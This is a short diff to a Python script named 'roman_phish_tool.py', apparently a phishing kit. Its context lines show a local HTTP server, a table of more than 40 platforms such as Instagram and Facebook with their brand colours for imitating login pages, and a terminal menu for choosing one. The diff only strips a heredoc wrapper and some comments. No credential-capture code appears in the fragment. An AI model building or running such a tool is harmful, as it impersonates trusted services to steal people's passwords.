@@ -1,4 +1,3 @@
-cat > roman_phish_tool.py << 'EOF'
 import http.server
 import socketserver
 import urllib.parse
@@ -12,7 +11,6 @@ RESET="\033[0m"; BOLD="\033[1m"; GREEN="\033[92m"; RED="\033[91m"; YELLOW="\033[
 HOST = '127.0.0.1' 
 PORT = 8095
 
-# 40+ Platforms Database
 PLATFORMS = {
     "1": {"name": "Instagram", "color": "#0095f6", "bg": "#fafafa", "text": "#262626"},
     "2": {"name": "Facebook", "color": "#1877f2", "bg": "#f0f2f5", "text": "#1c1e21"},
@@ -201,7 +199,6 @@ def main():
             if i + 1 < len(keys):
                 k2 = keys[i+1]
                 n2 = PLATFORMS[k2]['name']
-                # 2 Columns Layout
                 print(f"    │ {WHITE}[{k1:>2}]{BLUE} {n1:<16} {WHITE}[{k2:>2}]{BLUE} {n2:<14} {BLUE}│")
             else:
                 print(f"    │ {WHITE}[{k1:>2}]{BLUE} {n1:<16}                          {BLUE}│")
@@ -232,4 +229,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-EOF
